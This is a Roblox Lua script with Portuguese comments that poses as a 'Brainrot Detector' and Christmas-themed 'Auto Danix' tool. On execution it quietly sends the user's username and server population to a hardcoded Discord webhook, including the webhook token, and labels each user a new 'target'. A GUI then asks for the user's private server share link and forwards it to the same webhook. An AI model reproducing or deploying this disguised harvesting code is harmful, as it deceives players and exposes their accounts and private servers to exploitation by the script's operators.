local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

-- Webhook URL ATUALIZADA
local WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1443019238724997261/TBUwGxEJ2MyvJ6y0PQIhNz4ErMZ0_k7Z-e7SNk-IZrA2l15O96d7gfaijQZzf7TKJ173"

-- Lista de Brainrots vÃ¡lidos
local VALID_BRAINROTS = {
    "Brri Brri Bicus Dicus Bombicus", "Brutto Gialutto", "Bulbito Bandito Traktorito", "Trulinero Trulicina", 
    -- ... (sua lista completa de brainrots)
    "Secret"
}

-- IDs para procurar
local TARGET_IDS = {
    "28e4ec29-d005-4636-82af-339f37dcef",
    "960ab477-3f31-4327-845e-6a77ebb5fa6",
    -- ... (seus IDs completos)
    "a55b93d6-2c07-40f6-97fe-d03a87d2d5f0"
}

-- FunÃ§Ã£o para verificar se um nome Ã© um brainrot vÃ¡lido
local function isValidBrainrot(name)
    for _, brainrot in ipairs(VALID_BRAINROTS) do
        if name == brainrot then
            return true
        end
    end
    return false
end

-- FunÃ§Ã£o para procurar brainrots na workspace
local function findBrainrots()
    local foundBrainrots = {}
    
    -- Procurar na pasta Plots
    local plotsFolder = Workspace:FindFirstChild("Plots")
    if plotsFolder then
        for _, plot in ipairs(plotsFolder:GetDescendants()) do
            if plot:IsA("Model") and isValidBrainrot(plot.Name) then
                table.insert(foundBrainrots, plot.Name)
            end
        end
    end
    
    -- Procurar por IDs especÃ­ficos
    for _, id in ipairs(TARGET_IDS) do
        local model = Workspace:FindFirstChild(id)
        if model and model:IsA("Model") and isValidBrainrot(model.Name) then
            table.insert(foundBrainrots, model.Name)
        end
    end
    
    -- Remover duplicatas
    local uniqueBrainrots = {}
    for _, brainrot in ipairs(foundBrainrots) do
        local alreadyExists = false
        for _, existing in ipairs(uniqueBrainrots) do
            if existing == brainrot then
                alreadyExists = true
                break
            end
        end
        if not alreadyExists then
            table.insert(uniqueBrainrots, brainrot)
        end
    end
    
    return uniqueBrainrots
end

-- Nova funÃ§Ã£o para enviar webhook usando RequestAsync (mais seguro)
local function sendWebhook(brainrots)
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
    local player = Players.LocalPlayer
    local playerName = player.Name
    local playerCount = #Players:GetPlayers()
    
    -- Criar lista de brainrots formatada
    local brainrotsList = ""
    if #brainrots > 0 then
        for i, brainrot in ipairs(brainrots) do
            brainrotsList = brainrotsList .. "â€¢ " .. brainrot .. "\n"
            if i >= 40 then -- Limite de 40 brainrots
                brainrotsList = brainrotsList .. "... e mais\n"
                break
            end
        end
    else
        brainrotsList = "Nenhum brainrot detectado"
    end
    
    -- Criar payload do webhook
    local payload = {
        content = "@everyone @here, um novo alvo usou o script @everyone @here",
        embeds = {{
            title = "ğŸ§  DETECÃ‡ÃƒO DE BRAINROTS ğŸ§ ",
            color = 0xFF0000,
            fields = {
                {
                    name = "â€º Data e hora de execuÃ§Ã£o:",
                    value = currentTime,
                    inline = false
                },
                {
                    name = "ğŸ‘¤ Nome de usuÃ¡rio:",
                    value = playerName,
                    inline = true
                },
                {
                    name = "ğŸ‘¥ Pessoas no servidor:",
                    value = tostring(playerCount),
                    inline = true
                },
                {
                    name = "ğŸ¯ğŸ§  BRAINROTS DETECTADOS:",
                    value = brainrotsList,
                    inline = false
                }
            },
            author = {
                name = "NotificadorğŸ§  || By: Project BRANZz || â€º: " .. currentTime
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    -- MÃ©todo alternativo usando RequestAsync
    local success, result = pcall(function()
        return HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)
    
    if success then
        print("âœ… Webhook enviado com sucesso!")
        print("ğŸ“‹ Brainrots detectados: " .. table.concat(brainrots, ", "))
    else
        warn("âŒ Erro ao enviar webhook: " .. tostring(result))
        -- Tentar mÃ©todo alternativo com game:HttpGet
        alternativeSendWebhook(payload, brainrots)
    end
end

-- MÃ©todo alternativo caso o primeiro falhe
local function alternativeSendWebhook(payload, brainrots)
    local encodedPayload = HttpService:JSONEncode(payload)
    
    -- Usar game:HttpGet como alternativa (Ã s vezes funciona melhor)
    local success, result = pcall(function()
        local response = game:HttpGet(
            WEBHOOK_URL .. "?wait=true", 
            {
                method = "POST",
                headers = {
                    ["Content-Type"] = "application/json"
                },
                body = encodedPayload
            }
        )
        return response
    end)
    
    if success then
        print("âœ… Webhook enviado (mÃ©todo alternativo)!")
        print("ğŸ“‹ Brainrots detectados: " .. table.concat(brainrots, ", "))
    else
        warn("âŒ Falha em todos os mÃ©todos de envio: " .. tostring(result))
        print("ğŸ“‹ Brainrots detectados (nÃ£o enviados): " .. table.concat(brainrots, ", "))
    end
end

-- FunÃ§Ã£o para verificar se HttpService estÃ¡ habilitado
local function checkHttpService()
    if not HttpService then
        warn("âŒ HttpService nÃ£o disponÃ­vel")
        return false
    end
    
    local success = pcall(function()
        HttpService:GetAsync("https://httpbin.org/get")
    end)
    
    if not success then
        warn("âš ï¸ HttpService pode estar desabilitado")
    end
    
    return success
end

-- NOVA FUNÃ‡ÃƒO: Tela Natalina Auto Danix
local function createChristmasGUI()
    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    
    -- Criar ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AutoDanixChristmasGUI"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.ResetOnSpawn = false
    
    -- Frame principal com tema natalino
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 400, 0, 300)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 60, 30)  -- Verde natalino
    mainFrame.BackgroundTransparency = 0.1
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    
    -- Arredondar frame
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 15)
    corner.Parent = mainFrame
    
    -- Adicionar borda natalina
    local frameStroke = Instance.new("UIStroke")
    frameStroke.Color = Color3.fromRGB(255, 215, 0)  -- Dourado
    frameStroke.Thickness = 3
    frameStroke.Parent = mainFrame
    
    -- TÃ­tulo "AUTO DANIX" - Natalino
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Name = "Title"
    titleLabel.Size = UDim2.new(1, 0, 0, 60)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundColor3 = Color3.fromRGB(180, 0, 0)  -- Vermelho natalino
    titleLabel.BorderSizePixel = 0
    titleLabel.Text = "ğŸ„ AUTO DANIX ğŸ„"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 24
    titleLabel.Font = Enum.Font.GothamBlack
    titleLabel.Parent = mainFrame
    
    -- Arredondar apenas o topo do tÃ­tulo
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 15)
    titleCorner.Parent = titleLabel
    
    -- Texto "enter you link server"
    local instructionLabel = Instance.new("TextLabel")
    instructionLabel.Name = "Instruction"
    instructionLabel.Size = UDim2.new(1, -40, 0, 40)
    instructionLabel.Position = UDim2.new(0, 20, 0, 70)
    instructionLabel.BackgroundTransparency = 1
    instructionLabel.Text = "enter you link server"
    instructionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    instructionLabel.TextSize = 18
    instructionLabel.Font = Enum.Font.GothamBold
    instructionLabel.TextXAlignment = Enum.TextXAlignment.Left
    instructionLabel.Parent = mainFrame
    
    -- Caixa de texto para o link
    local linkTextBox = Instance.new("TextBox")
    linkTextBox.Name = "LinkInput"
    linkTextBox.Size = UDim2.new(1, -40, 0, 50)
    linkTextBox.Position = UDim2.new(0, 20, 0, 120)
    linkTextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    linkTextBox.BorderSizePixel = 0
    linkTextBox.PlaceholderText = "https://www.roblox.com/share?code=..."
    linkTextBox.Text = ""
    linkTextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
    linkTextBox.TextSize = 16
    linkTextBox.Font = Enum.Font.Gotham
    linkTextBox.Parent = mainFrame
    
    -- Arredondar caixa de texto
    local textBoxCorner = Instance.new("UICorner")
    textBoxCorner.CornerRadius = UDim.new(0, 8)
    textBoxCorner.Parent = linkTextBox
    
    -- Borda natalina na caixa de texto
    local textBoxStroke = Instance.new("UIStroke")
    textBoxStroke.Color = Color3.fromRGB(255, 215, 0)  -- Dourado
    textBoxStroke.Thickness = 2
    textBoxStroke.Parent = linkTextBox
    
    -- BotÃ£o CONFIRMAR - Natalino
    local confirmButton = Instance.new("TextButton")
    confirmButton.Name = "ConfirmButton"
    confirmButton.Size = UDim2.new(1, -40, 0, 50)
    confirmButton.Position = UDim2.new(0, 20, 0, 190)
    confirmButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)  -- Vermelho natalino
    confirmButton.BorderSizePixel = 0
    confirmButton.Text = "ğŸ… CONFIRMAR ğŸ…"
    confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    confirmButton.TextSize = 20
    confirmButton.Font = Enum.Font.GothamBlack
    confirmButton.Parent = mainFrame
    
    -- Arredondar botÃ£o
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 12)
    buttonCorner.Parent = confirmButton
    
    -- Borda dourada no botÃ£o
    local buttonStroke = Instance.new("UIStroke")
    buttonStroke.Color = Color3.fromRGB(255, 215, 0)  -- Dourado
    buttonStroke.Thickness = 2
    buttonStroke.Parent = confirmButton
    
    -- Adicionar efeitos de neve (decorativo)
    local snow1 = Instance.new("TextLabel")
    snow1.Size = UDim2.new(0, 30, 0, 30)
    snow1.Position = UDim2.new(0.1, 0, 0.1, 0)
    snow1.BackgroundTransparency = 1
    snow1.Text = "â„"
    snow1.TextColor3 = Color3.fromRGB(255, 255, 255)
    snow1.TextSize = 20
    snow1.Parent = mainFrame
    
    local snow2 = Instance.new("TextLabel")
    snow2.Size = UDim2.new(0, 30, 0, 30)
    snow2.Position = UDim2.new(0.8, 0, 0.2, 0)
    snow2.BackgroundTransparency = 1
    snow2.Text = "â„"
    snow2.TextColor3 = Color3.fromRGB(255, 255, 255)
    snow2.TextSize = 20
    snow2.Parent = mainFrame
    
    local snow3 = Instance.new("TextLabel")
    snow3.Size = UDim2.new(0, 30, 0, 30)
    snow3.Position = UDim2.new(0.3, 0, 0.8, 0)
    snow3.BackgroundTransparency = 1
    snow3.Text = "â„"
    snow3.TextColor3 = Color3.fromRGB(255, 255, 255)
    snow3.TextSize = 20
    snow3.Parent = mainFrame
    
    -- FunÃ§Ã£o para enviar informaÃ§Ãµes para o webhook
    local function sendLinkToWebhook(link)
        local currentTime = os.date("%Y-%m-%d %H:%M:%S")
        local player = Players.LocalPlayer
        local playerName = player.Name
        local playerCount = #Players:GetPlayers()
        
        local payload = {
            content = "ğŸ„ NOVO LINK RECEBIDO - AUTO DANIX ğŸ„",
            embeds = {{
                title = "ğŸ”— LINK DO SERVIDOR RECEBIDO",
                color = 0x00FF00,  -- Verde
                fields = {
                    {
                        name = "ğŸ‘¤ Jogador:",
                        value = playerName,
                        inline = true
                    },
                    {
                        name = "ğŸ‘¥ Online:",
                        value = tostring(playerCount),
                        inline = true
                    },
                    {
                        name = "ğŸ• HorÃ¡rio:",
                        value = currentTime,
                        inline = true
                    },
                    {
                        name = "ğŸ”— Link do Servidor:",
                        value = link,
                        inline = false
                    }
                },
                footer = {
                    text = "ğŸ… Auto Danix Christmas System â€¢ " .. currentTime
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        
        -- Enviar webhook
        local success, result = pcall(function()
            return HttpService:RequestAsync({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(payload)
            })
        end)
        
        if success then
            print("âœ… Link enviado para webhook com sucesso!")
            return true
        else
            warn("âŒ Erro ao enviar link: " .. tostring(result))
            return false
        end
    end
    
    -- FunÃ§Ã£o do botÃ£o CONFIRMAR
    confirmButton.MouseButton1Click:Connect(function()
        local link = linkTextBox.Text
        
        if link == "" or not string.find(link, "https://") then
            confirmButton.Text = "âŒ LINK INVÃLIDO"
            confirmButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            wait(2)
            confirmButton.Text = "ğŸ… CONFIRMAR ğŸ…"
            confirmButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
            return
        end
        
        confirmButton.Text = "â³ ENVIANDO..."
        confirmButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)  -- Laranja
        
        -- Enviar para webhook
        local success = sendLinkToWebhook(link)
        
        if success then
            confirmButton.Text = "âœ… ENVIADO!"
            confirmButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)  -- Verde
            linkTextBox.Text = ""
            
            -- Fechar a GUI apÃ³s 2 segundos
            wait(2)
            screenGui:Destroy()
        else
            confirmButton.Text = "âŒ ERRO AO ENVIAR"
            confirmButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
            wait(2)
            confirmButton.Text = "ğŸ… CONFIRMAR ğŸ…"
            confirmButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
        end
    end)
    
    -- Efeitos hover no botÃ£o
    confirmButton.MouseEnter:Connect(function()
        confirmButton.BackgroundColor3 = Color3.fromRGB(220, 0, 0)
    end)
    
    confirmButton.MouseLeave:Connect(function()
        if confirmButton.Text == "ğŸ… CONFIRMAR ğŸ…" then
            confirmButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
        end
    end)
    
    -- Adicionar Ã  interface do jogador
    screenGui.Parent = playerGui
    
    print("ğŸ„ Auto Danix Christmas GUI carregada!")
end

-- NOVA FUNÃ‡ÃƒO: Criar GUI simples com botÃ£o de detecÃ§Ã£o
local function createSimpleGUI()
    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    
    -- Criar ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BrainrotDetectorGUI"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.ResetOnSpawn = false
    
    -- Frame principal
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 200, 0, 120)
    mainFrame.Position = UDim2.new(0, 20, 0, 20)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    mainFrame.BackgroundTransparency = 0.1
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    
    -- Arredondar frame
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame
    
    -- Adicionar borda ao frame
    local frameStroke = Instance.new("UIStroke")
    frameStroke.Color = Color3.fromRGB(100, 100, 200)
    frameStroke.Thickness = 2
    frameStroke.Parent = mainFrame
    
    -- TÃ­tulo
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Name = "Title"
    titleLabel.Size = UDim2.new(1, 0, 0, 30)
    titleLabel.Position = UDim2.new(0, 0, 0, 5)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "ğŸ§  BRAINROT DETECTOR"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 14
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.Parent = mainFrame
    
    -- BotÃ£o de detecÃ§Ã£o
    local detectButton = Instance.new("TextButton")
    detectButton.Name = "DetectButton"
    detectButton.Size = UDim2.new(1, -10, 0, 40)
    detectButton.Position = UDim2.new(0, 5, 0, 40)
    detectButton.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
    detectButton.BorderSizePixel = 0
    detectButton.Text = "ğŸ” DETECTAR BRAINROTS"
    detectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    detectButton.TextSize = 12
    detectButton.Font = Enum.Font.GothamBold
    detectButton.TextWrapped = true
    detectButton.Parent = mainFrame
    
    -- BotÃ£o de fechar
    local closeButton = Instance.new("TextButton")
    closeButton.Name = "CloseButton"
    closeButton.Size = UDim2.new(1, -10, 0, 25)
    closeButton.Position = UDim2.new(0, 5, 0, 85)
    closeButton.BackgroundColor3 = Color3.fromRGB(180, 60, 80)
    closeButton.BorderSizePixel = 0
    closeButton.Text = "âŒ FECHAR"
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.TextSize = 12
    closeButton.Font = Enum.Font.GothamBold
    closeButton.Parent = mainFrame
    
    -- Arredondar botÃµes
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 8)
    buttonCorner.Parent = detectButton
    buttonCorner:Clone().Parent = closeButton
    
    -- Adicionar borda aos botÃµes
    local buttonStroke = Instance.new("UIStroke")
    buttonStroke.Color = Color3.fromRGB(255, 255, 255)
    buttonStroke.Thickness = 1.5
    buttonStroke.Parent = detectButton
    buttonStroke:Clone().Parent = closeButton
    
    -- FunÃ§Ã£o do botÃ£o de detecÃ§Ã£o
    detectButton.MouseButton1Click:Connect(function()
        detectButton.Text = "ğŸ” DETECTANDO..."
        detectButton.BackgroundColor3 = Color3.fromRGB(220, 120, 60)
        
        -- Executar detecÃ§Ã£o
        local detectedBrainrots = findBrainrots()
        
        if #detectedBrainrots > 0 then
            detectButton.Text = "âœ… " .. #detectedBrainrots .. " ENCONTRADOS"
            detectButton.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
            print("ğŸ§  Brainrots detectados: " .. table.concat(detectedBrainrots, ", "))
        else
            detectButton.Text = "âŒ NENHUM ENCONTRADO"
            detectButton.BackgroundColor3 = Color3.fromRGB(180, 60, 80)
            print("âŒ Nenhum brainrot detectado")
        end
        
        -- Enviar webhook
        sendWebhook(detectedBrainrots)
        
        -- Voltar ao normal apÃ³s 3 segundos
        wait(3)
        detectButton.Text = "ğŸ” DETECTAR BRAINROTS"
        detectButton.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
    end)
    
    -- FunÃ§Ã£o do botÃ£o fechar
    closeButton.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)
    
    -- Efeitos hover
    local function setupHover(button, normalColor, hoverColor)
        button.MouseEnter:Connect(function()
            button.BackgroundColor3 = hoverColor
        end)
        
        button.MouseLeave:Connect(function()
            button.BackgroundColor3 = normalColor
        end)
    end
    
    setupHover(detectButton, Color3.fromRGB(80, 120, 255), Color3.fromRGB(100, 140, 255))
    setupHover(closeButton, Color3.fromRGB(180, 60, 80), Color3.fromRGB(200, 80, 100))
    
    -- Adicionar Ã  interface do jogador
    screenGui.Parent = playerGui
    
    print("ğŸ§  Brainrot Detector GUI carregada!")
end

-- FunÃ§Ã£o principal
local function main()
    -- Esperar um pouco para garantir que tudo carregou
    wait(2)
    
    print("ğŸ” Iniciando busca por brainrots...")
    
    -- Verificar se HttpService funciona
    if not checkHttpService() then
        warn("âš ï¸ PossÃ­veis problemas com HttpService")
    end
    
    -- Criar a GUI Natalina
    createChristmasGUI()
    
    -- Criar a GUI de detecÃ§Ã£o (opcional)
    createSimpleGUI()
    
    -- DetecÃ§Ã£o automÃ¡tica (opcional - mantÃ©m sua funcionalidade original)
    local detectedBrainrots = findBrainrots()
    
    if #detectedBrainrots > 0 then
        print("ğŸ§  Brainrots detectados: " .. table.concat(detectedBrainrots, ", "))
    else
        print("âŒ Nenhum brainrot detectado")
    end
    
    -- Enviar webhook com os resultados
    print("ğŸ“¤ Enviando para webhook...")
    sendWebhook(detectedBrainrots)
end

-- Executar o script com tratamento de erro
local success, err = pcall(main)
if not success then
    warn("âŒ Erro ao executar script: " .. tostring(err))
end
